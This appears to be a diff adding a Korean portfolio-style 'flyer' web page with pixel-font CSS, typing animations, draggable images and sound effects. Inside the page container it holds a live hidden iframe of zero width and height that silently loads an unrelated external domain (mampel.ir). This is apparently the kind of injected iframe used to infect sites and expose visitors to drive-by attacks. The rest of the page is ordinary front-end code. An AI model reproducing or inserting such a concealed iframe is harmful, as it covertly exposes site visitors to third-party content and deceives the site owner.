@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<title>전단지 </title>
+<style>
+@font-face {
+      font-family: "DungGeunMo";
+      src: url("DungGeunMo.woff");
+    }
+	
+	body{background-color: #484535; font-family: "DungGeunMo";}
+	#backk{width: auto; height: 100%; animation:start 2s alternate;}
+	#backk img{width: 1250px; height: auto;}
+	
+	#bx { position: absolute; bottom: 5%; left: 25%; display:none; }
+	#bx img{ width: 70%; height: auto;  }
+
+	#poom{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+
+	#okk{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#okk img{height: 20px;width: auto; }
+
+	#oo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oo img{height: 20px;width: auto; }
+
+
+#coco{ z-index: 2;
+			animation: mmove 5s infinite;
+			animation-duration: 4s;
+			animation-iteration-count: 1;
+			animation-direction: alternate;
+			animation-fill-mode: both;
+			}
+			@keyframes mmove {
+    		0%{transform: rotateX(180deg);}
+    		100%{transform: rotateY(360deg);}
+    		}
+
+[draggable] {
+  cursor: move;
+}
+
+p {position: absolute;
+  text-align: center;
+  font-size: 2em;
+  color: #b5b8e4;
+  font-weight: 800;
+  left: 654px;
+  z-index: 5;
+}
+
+	#sigar { position: absolute; z-index: 99;cursor: pointer; bottom:60%; right: 35%; }
+	#sigar img{ position: absolute; width: 400px; height: 150px;z-index: 99;cursor: pointer;}
+
+	#out { position: absolute; z-index: 99;cursor: pointer; bottom:69%;left: 43%; }
+	#out img{ position: absolute; width: 140px; height: 50px;z-index: 99;cursor: pointer;}
+
+	#turn{bottom: 8%; left: 48%; position: absolute;animation: backk 3s alternate; }
+	#turn img{width: 40px; height: auto;cursor: pointer; }
+	#tt { position: absolute; z-index: 99; top: 8%; left: 37%; animation: tra 2s alternate; display: none;cursor: pointer; }
+	#tt img{ position: absolute; z-index: 99; width: 500px; height: auto; }	
+	#nn{bottom: 18%; font-weight: 5px; font-size: 1.5em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#container{position: relative; margin: auto; width:1250px; height: 1000px;font-family: "DungGeunMo"; }
+
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+@keyframes start{
+			0%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}
+
+@keyframes inin{
+			0%{top: 71%;}
+			
+			100%{top: 68%;}
+		}
+@keyframes backk{
+			0%{bottom: 11%;}
+			
+			100%{bottom: 8%;}
+		}			
+@keyframes rig{
+			0%{right: 48%;}
+			
+			100%{right: 45%;}
+		}		
+@keyframes heree{
+			0%{right: 20%;}
+			
+			100%{right: 18%;}
+		}
+@keyframes tra{
+			0%{opacity: 0}
+			
+			100%{opacity: 1}
+		}
+h1 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 31ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate;z-index: 3;
+}
+h2 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 35ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(18, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 18ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h4 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 50ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h5 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 39ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h6 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 10ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h10{color: #b0ab9e;position: absolute;z-index: 3;}
+p { 
+	color: black;
+	position: absolute;
+	
+	width: 53ch;
+	margin: 2em 1em;
+	}
+
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+<img draggable="true" src="paper2.png"  style="  position: absolute; left:  350px; top: 100px; z-index: 5;">
+<img draggable="true" src="paper3.png"  style="  position: absolute; left:  550px; top: 700px; z-index: 5;">
+<img draggable="true" src="paper4.png"  style="  position: absolute; left:  850px; top: 500px; z-index: 7;">
+
+<img draggable="true" src="hole.png"  style="  position: absolute; left:  750px; top: 50px; z-index: 6;">
+
+	<div id="container">
+	 	<audio id="paper">
+		<source src="paper.mp3" type="audio/mpeg">
+	</audio>
+	<audio id="but">
+		<source src="but.mp3" type="audio/mpeg">
+	</audio>
+
+
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+
+	<div id="backk">
+		<center>
+		<img src="main.png">
+		</center>
+	</div>
+	<a href="https://seoojing.github.io/popol-in/">
+	<div id="turn">
+		<img src="turn.png">
+	</div>
+</a>
+
+
+	<div id="bx">
+		<img src="boox.png">
+	</div>
+
+	<a href="https://seoojing.github.io/up/">
+
+	</a>
+	
+</div>
+<script type="text/javascript">
+(function dragndrop() {
+  let xpos = '';
+  let ypos = '';
+  let whichArt = '';
+
+  function resetZ() {
+    const imgEl = document.querySelectorAll('img');
+    for (let i = imgEl.length - 1; i >= 0; i--) {
+      imgEl[i].style.zIndex = 5;
+    }
+  }
+  
+  function moveStart(e) {
+    whichArt = e.target;
+    xpos = e.offsetX === undefined ? e.layerX : e.offsetX;
+    ypos = e.offsetY === undefined ? e.layerY : e.offsetY;
+    whichArt.style.zIndex = 10;
+  }
+
+  function moveDragOver(e) {
+    e.preventDefault();
+  }
+
+  function moveDrop(e) {
+    e.preventDefault();
+    whichArt.style.left = e.pageX - xpos + 'px';
+    whichArt.style.top = e.pageY - ypos + 'px';
+  }
+  
+  function touchStart(e) {
+    e.preventDefault();
+    const whichArt = e.target;
+    const touch = e.touches[0];
+    let moveOffsetX = whichArt.offsetLeft - touch.pageX;
+    let moveOffsetY = whichArt.offsetTop - touch.pageY;
+    resetZ();
+    whichArt.style.zIndex = 10;
+
+    whichArt.addEventListener('touchmove', function() {
+      let posX = touch.pageX + moveOffsetX;
+      let posY = touch.pageY + moveOffsetY;
+      whichArt.style.left = posX + 'px';
+      whichArt.style.top = posY + 'px';
+    }, false);
+    paper.play();
+  }
+
+  document.querySelector('body').addEventListener('dragstart', moveStart, false);
+  document.querySelector('body').addEventListener('dragover', moveDragOver, false);
+  document.querySelector('body').addEventListener('drop', moveDrop, false);
+  
+  document.querySelector('body').addEventListener('touchstart', touchStart, false);
+
+})();
+
+
+var bbPlay = 0;
+window.onmousemove = function(){
+	bbPlay++;
+	if(bbPlay == 1){paper.play();}
+}
+
+	
+
+</script>
+</body>
+</html>
